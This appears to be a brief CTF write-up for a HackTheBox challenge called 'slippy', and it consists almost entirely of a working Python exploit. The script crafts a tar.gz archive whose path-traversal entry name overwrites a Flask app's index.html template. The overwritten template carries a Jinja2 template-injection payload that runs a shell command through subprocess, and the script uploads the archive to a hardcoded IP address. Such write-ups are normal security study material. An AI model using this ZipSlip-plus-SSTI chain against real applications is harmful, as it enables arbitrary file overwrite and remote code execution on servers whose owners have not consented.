---
description: htb slippy
---

# ZipSlip

```
#py

import io
import tarfile
import time
import requests

url = "http://178.128.174.129:30633"
#name = "hello.txt"
#name = "../../../../../../../../../../../../app/application/blueprints/routes.py"
name = "../../../../../../../../../../../../../../../../app/application/templates/index.html"

#data = b"""
#fHer
#"""

data = b"""
{{ ''.__class__.__mro__[1].__subclasses__()[223]('cat /app/flag', shell=True, stdout=-1).communicate()[0].decode('utf-8') }}
"""

#data = b"""
#from flask import Blueprint, request, render_template, abort
#from application.util import extract_from_archive

#web = Blueprint('web', __name__)
#api = Blueprint('api', __name__)

#@web.route('/')
#def index():
    #return render_template('index.html')

#@web.route('/flag')
#def flag():
    #return open('/app/flag').read()

#@api.route('/unslippy', methods=['POST'])
#def cache():
    #if 'file' not in request.files:
        #return abort(400)

    #extraction = extract_from_archive(request.files['file'])
    #if extraction:
        #return {"list": extraction}, 200

    #return '', 204
#"""

source_f = io.BytesIO(initial_bytes=data)

fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode="w:gz") as tar:
    info = tarfile.TarInfo(name)

    info.size = len(data)
    info.mtime = time.time()
    tar.addfile(info, source_f)

with open("test.tar.gz", "wb") as f:
    f.write(fh.getvalue())

s = requests.Session()

r = s.post(url + "/api/unslippy", files={"file": fh.getvalue()})

print(r.text)
#print(s.get(url).text)
```
